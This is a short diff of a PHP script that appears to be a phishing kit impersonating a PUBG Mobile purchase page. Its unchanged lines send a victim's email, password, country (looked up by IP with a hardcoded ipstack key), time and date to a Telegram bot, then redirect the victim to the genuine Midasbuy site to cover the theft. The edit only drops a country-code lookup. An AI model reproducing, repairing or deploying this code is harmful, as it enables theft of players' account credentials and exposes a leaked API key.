@@ -42,11 +42,11 @@ $api_key = "26dc150b1cf3c41dc866400812300e6d";
 $cty = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
 $jsondata = json_decode($cty);
 $cty = $jsondata->country_name;
-  $code = file_get_contents("https://countrycode.org/".cty1."")
 
-$jsondata = json_decode($code);
 
-$cod = $jsondata->country_code;  
+
+
+
 $url1 = "https://www.midasbuy.com/midasbuy/ot/buy/pubgm";
 header("location: $url1");
 $name = $message->from->first_name;
@@ -57,7 +57,6 @@ bot("sendMessage",[
 👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » `$email`
 📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » `$password`
 👁️‍🗨️¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 » $cty
-👁️‍🗨️¦ Code » $code
 ⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
 📝 ¦ 𝑫𝒂𝒕𝒆 » $day/$month/$year
 🌐¦ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌 » https://$linky/index.php
